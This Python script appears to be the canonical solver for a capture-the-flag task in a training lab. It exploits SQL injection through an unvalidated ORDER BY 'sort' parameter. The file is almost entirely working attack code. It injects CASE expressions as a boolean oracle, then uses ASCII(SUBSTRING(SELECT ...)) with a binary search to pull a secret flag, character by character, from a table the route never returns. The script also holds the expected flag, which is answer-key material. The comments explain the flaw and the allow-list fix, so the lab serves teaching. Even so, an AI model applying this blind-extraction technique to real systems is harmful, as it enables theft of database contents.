#!/usr/bin/env python3
# solvers/p5_2.py, Task 5.2 "The Royal Guard Rankings" canonical exploit.
#
# challenges/phase5.py's p5_roster() route lists a public roster sorted by
# a caller-supplied `sort` value, spliced straight into the ORDER BY clause
# via SQLAlchemy's text() escape hatch. ORDER BY is an identifier/expression
# position: a bound parameter can only stand in for a value, never for a
# column or an ordering expression, so there is no parameterized form of
# "order by the caller's choice" at all, the only correct fix is an
# allow-list (learn-orm-injection.md §4). Because this route allow-lists
# nothing, a caller can supply an entire ORDER BY *expression*, a CASE
# boolean oracle, instead of a column name.
#
# The flag lives in `royal_seal`, a table this route never selects into any
# response. This script reads it out blind, one character at a time, by
# making the injected ORDER BY expression ask a yes/no question about each
# character and observing which roster row the expression sorts first:
#
#   sort = (CASE WHEN <condition> THEN name ELSE division END)
#
# When <condition> is TRUE the roster sorts by name (first row
# "Menthuthuyoupi"); when FALSE it sorts by division (first row
# "Neferpitou"). That one-bit readout drives a binary search over each
# character's ASCII value. ASCII() is used rather than a direct character
# comparison specifically to stay case-correct: MariaDB's default collation
# is case-insensitive, so `'S' = 's'` would be true, but ASCII('S')=83 and
# ASCII('s')=115 are distinct (the same case-sensitivity nuance as p4_6's
# LDAP extraction).
#
# This script proves three things against the live stack, in order:
#   1. An invalid sort column is rejected, proof `sort` reaches real SQL.
#   2. The CASE oracle produces a crisp, observable true/false signal.
#   3. The full flag is recovered character-by-character off that oracle.

import sys
import urllib.parse
import urllib.request

BASE = __import__("os").environ.get("SEIYAKU_BASE", "http://localhost:8000")
ROUTE = f"{BASE}/p5/roster"
EXPECTED_FLAG = "SEIYAKU{order_by_cant_be_bound}"

# The two roster members whose relative order encodes the oracle bit.
TRUE_MARKER = "Menthuthuyoupi"   # first row when the CASE condition is TRUE  (sort by name)
FALSE_MARKER = "Neferpitou"      # first row when the CASE condition is FALSE (sort by division)

import json


def _first_member(sort_value: str):
    """Send one request with the given `sort` value, return the first
    roster member's name (or None on error)."""
    qs = urllib.parse.urlencode({"sort": sort_value})
    req = urllib.request.Request(
        f"{ROUTE}?{qs}", headers={"Accept": "application/json"}
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        data = json.loads(resp.read().decode("utf-8"))
    if data.get("error") or not data.get("members"):
        return None, data.get("error")
    return data["members"][0]["name"], None


def oracle(condition: str) -> bool:
    """Return True if the injected CASE `condition` holds, read off which
    roster row sorts first."""
    sort_value = f"(CASE WHEN {condition} THEN name ELSE division END)"
    first, err = _first_member(sort_value)
    if err:
        raise RuntimeError(f"oracle request errored: {err}")
    return first == TRUE_MARKER


def char_ascii_at(pos: int) -> int:
    """Binary-search the ASCII value of the flag's character at 1-indexed
    position `pos`. Returns 0 if the position is past the end of the flag
    (ASCII of an empty string is 0 in MariaDB)."""
    expr = f"ASCII(SUBSTRING((SELECT flag FROM royal_seal LIMIT 1),{pos},1))"
    lo, hi = 0, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"{expr}>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo


def main() -> int:
    print(f"[p5_2] target: {ROUTE}")

    # --- Step 1: detection, an invalid column reaches real SQL -----------
    print("[p5_2] step 1: invalid sort column is rejected (sort reaches SQL)")
    _, err = _first_member("this_column_does_not_exist")
    if err:
        print(f"  ok: invalid column rejected -> {err!r}")
    else:
        print("[p5_2] FAIL: invalid column was NOT rejected; sort may not reach SQL")
        return 1

    # --- Step 2: confirm the oracle gives a clean true/false signal -------
    print("[p5_2] step 2: confirm the CASE ordering oracle")
    true_first, _ = _first_member("(CASE WHEN 1=1 THEN name ELSE division END)")
    false_first, _ = _first_member("(CASE WHEN 1=2 THEN name ELSE division END)")
    print(f"  TRUE  (1=1) -> first row {true_first!r}")
    print(f"  FALSE (1=2) -> first row {false_first!r}")
    if true_first == TRUE_MARKER and false_first == FALSE_MARKER:
        print("  ok: oracle produces a crisp, observable true/false signal")
    else:
        print("[p5_2] FAIL: oracle signal was not as expected")
        return 1

    # --- Step 3: blind extraction of the flag ----------------------------
    print("[p5_2] step 3: blind-extract the sealed flag off the ordering oracle")
    chars = []
    pos = 1
    while True:
        code = char_ascii_at(pos)
        if code == 0:
            break
        ch = chr(code)
        chars.append(ch)
        sys.stdout.write(ch)
        sys.stdout.flush()
        pos += 1
        if pos > 200:  # safety bound
            break
    print()
    recovered = "".join(chars)
    print(f"[p5_2] recovered flag: {recovered}")

    if recovered == EXPECTED_FLAG:
        print(f"  ok: recovered flag matches: {recovered}")
    else:
        print(f"[p5_2] FAIL: recovered {recovered!r}, expected {EXPECTED_FLAG!r}")
        return 1

    print("[p5_2] ok: invalid column rejected, ordering oracle confirmed,")
    print("[p5_2]     flag blind-extracted through an ORDER BY identifier injection")
    print("[p5_2] PASS")
    return 0


if __name__ == "__main__":
    sys.exit(main())
